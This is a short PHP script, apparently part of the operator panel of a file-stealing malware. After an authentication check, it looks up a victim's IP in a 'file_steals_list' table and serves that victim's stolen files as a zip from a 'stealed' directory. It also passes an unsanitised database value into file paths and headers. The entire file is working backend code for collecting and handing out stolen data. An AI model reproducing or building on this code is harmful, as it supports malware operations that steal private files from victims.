<?php
include('../class/include.php');
if (!Account::isAuthentified())
{
    die("Bad request");
}

$ipl = $GLOBALS['DB']->GetContent('file_steals_list', ['id' => $_GET['ip']])[0]['ip'];

header('Content-Type: application/zip');
header('Content-disposition: attachment; filename='."../../beta/core/stealed/".$ipl."filesteal.zip");
header('Content-Length: ' . filesize("../../beta/core/stealed/".$ipl."filesteal.zip"));
readfile("../../beta/core/stealed/".$ipl."filesteal.zip");
?>